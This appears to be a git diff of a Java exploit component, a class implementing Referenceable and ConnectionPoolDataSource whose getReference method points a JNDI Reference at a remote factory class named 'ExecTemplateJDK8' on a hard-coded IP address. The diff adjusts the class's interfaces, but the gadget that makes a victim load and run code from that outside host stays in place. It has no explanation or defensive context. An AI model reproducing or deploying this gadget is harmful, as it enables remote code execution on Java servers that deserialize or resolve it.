@@ -14,7 +14,7 @@ import java.sql.SQLException;
 import java.sql.SQLFeatureNotSupportedException;
 import java.util.logging.Logger;
 
-public class extendImpl implements Referenceable , ConnectionPoolDataSource , Serializable , IndirectlySerialized {
+public class extendImpl implements Referenceable , ConnectionPoolDataSource {
     @Override
     public Reference getReference() throws NamingException {
         return new Reference("ExecTemplateJDK8","ExecTemplateJDK8","http://123.206.100.143:8180/");
@@ -55,8 +55,4 @@ public class extendImpl implements Referenceable , ConnectionPoolDataSource , Se
         return null;
     }
 
-    @Override
-    public Object getObject() throws ClassNotFoundException, IOException {
-        return null;
-    }
 }
